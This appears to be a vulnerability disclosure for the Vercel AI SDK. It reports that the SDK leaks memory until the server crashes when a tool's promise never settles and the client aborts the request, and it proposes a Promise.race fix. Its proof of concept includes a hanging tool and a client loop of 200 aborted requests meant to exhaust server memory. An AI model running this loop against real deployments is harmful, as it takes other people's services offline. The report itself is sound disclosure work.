# Denial of Service (OOM) via Unbounded Generator Retention in executeTool Async Boundary

**Target:** Vercel AI SDK (`@ai-sdk/core`)
**Weakness:** CWE-400: Uncontrolled Resource Consumption

## Summary
The AI SDK fails to enforce `AbortSignal` and `toolTimeoutMs` boundaries when awaiting user-space tool execution inside the `executeTool` async generator. If a client aborts a request while a tool is executing a hanging promise (e.g., waiting on a stalled external API), the SDK’s internal `TransformStream` permanently stalls. This orphans the generator frame, closure variables, and OpenTelemetry spans in the V8 heap, leading to a linear memory leak and eventual Denial of Service (OOM).

## Vulnerability Details
When the SDK executes a tool, it merges the client's `AbortSignal` with a configured `toolTimeoutMs`. It passes this merged signal to the developer's tool via the options object.

However, the SDK delegates the actual cancellation enforcement entirely to the developer's implementation. In `packages/provider-utils/src/types/execute-tool.ts`, the SDK yields the tool's result without a framework-level circuit breaker:

```typescript
// packages/provider-utils/src/types/execute-tool.ts (approx line 45)
const result = tool.execute(input, options);
// ...
yield { type: 'final', output: await result }; // <-- BLOCKS INDEFINITELY
```

Because there is no `Promise.race` wrapping `await result`, if the tool's external dependency hangs and the promise never settles, the generator is suspended indefinitely.

Consequently, the `Promise.all` batch inside `execute-tools-from-stream.ts` never resolves. The `TransformStream` callback freezes, leaving stream readers locked. Because the microtask remains pending in the event loop, V8 cannot garbage collect the generator frame, the conversation history (messages), or the active OpenTelemetry tracing spans.

### Why this is a Framework Vulnerability (Not just Developer Error):

1. **Host Stability:** The framework's core stream pipeline and telemetry hooks should never permanently lock due to a stalled downstream dependency.
2. **Inconsistent Enforcement:** The SDK already uses a defensive `awaitPromiseWithAbortSignal` wrapper inside `parse-tool-call.ts` to protect against hanging model responses. Failing to apply this same pattern to tool execution is a missing architectural guardrail.
3. **Broken Timeout Contract:** The SDK allows developers to configure a `toolTimeoutMs`, implying the framework will halt the tool if it exceeds this time. Because the timeout is only exposed as a signal rather than an active promise race, the timeout is physically incapable of unblocking the stream if the tool fails to listen for it.

## Impact
An unauthenticated attacker can trigger a tool known to query a slow or occasionally unresponsive external API, then immediately close their HTTP connection. By repeating this, the attacker forces the Node.js server to allocate memory and OpenTelemetry contexts that will never be swept. This reliably crashes the host process via Out-Of-Memory (OOM) exhaustion, causing a complete denial of service.

## Steps to Reproduce (PoC)
1. Initialize a standard Next.js / AI SDK endpoint.
2. Define a mock tool that simulates a hanging external API call (a common failure mode for third-party endpoints):

```typescript
import { tool, streamText } from 'ai';
import { z } from 'zod';

const hangingTool = tool({
  description: 'Queries an external vector database.',
  parameters: z.object({ query: z.string() }),
  execute: async ({ query }, { abortSignal }) => {
    // Simulates an external API that hangs without responding.
    // The developer forgot to pass `abortSignal` to their fetch client.
    return new Promise(() => {}); 
  }
});
```

3. Create a client script that repeatedly calls this endpoint and immediately aborts the connection:

```javascript
async function triggerLeak() {
  for (let i = 0; i < 200; i++) {
    const controller = new AbortController();
    fetch('http://localhost:3000/api/chat', { 
      method: 'POST', 
      body: JSON.stringify({ prompt: 'Use the hanging tool.' }),
      signal: controller.signal 
    }).catch(() => {});
    
    // Abort immediately after the tool execution begins
    setTimeout(() => controller.abort(), 100); 
  }
}
triggerLeak();
```

**Observation:** Monitor the server via `process.memoryUsage().heapUsed` with `--expose-gc`. The heap size increases linearly with every aborted request and does not drop after `global.gc()`, proving the closure and OpenTelemetry span retention.

## Suggested Remediation
Apply the same defensive racing pattern already used in `parse-tool-call.ts`. Wrap the `executeTool` promise in a race against the merged abort signal so the generator can cleanly reject, unblock the stream, and allow V8 to sweep the memory:

```typescript
const resultPromise = tool.execute(input, options);
const output = await Promise.race([
  resultPromise,
  new Promise((_, reject) => {
    if (options.abortSignal?.aborted) {
      reject(options.abortSignal.reason);
    }
    options.abortSignal?.addEventListener('abort', () => {
      reject(options.abortSignal.reason);
    }, { once: true });
  })
]);
```
